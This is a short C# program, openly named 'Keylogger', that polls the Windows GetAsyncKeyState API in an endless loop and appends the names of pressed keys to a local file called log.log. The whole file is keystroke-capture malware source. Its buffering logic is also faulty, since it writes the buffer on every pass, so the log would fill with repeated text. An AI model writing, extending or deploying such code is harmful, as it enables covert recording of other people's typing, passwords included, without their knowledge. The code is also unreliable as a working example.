using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
namespace Keylogger
{
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);
        [STAThread]
        static void Main(String[] args)
        {
            
            while (true)
            {
                string buf = " ";
                Thread.Sleep(100);
                for(int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if(state != 0)
                    {
                        if((Keys)i == Keys.Space) { buf += "space"; continue; }
                        if(((Keys)i).ToString().Length == 1)
                        {
                            buf += ((Keys)i).ToString();
                        }

                    }
                    if(((Keys)i).ToString().Length == 1)
                    {
                        File.AppendAllText("log.log" , buf);
                        buf += " ";
                    }
                }
            }
           
        }
    }
}
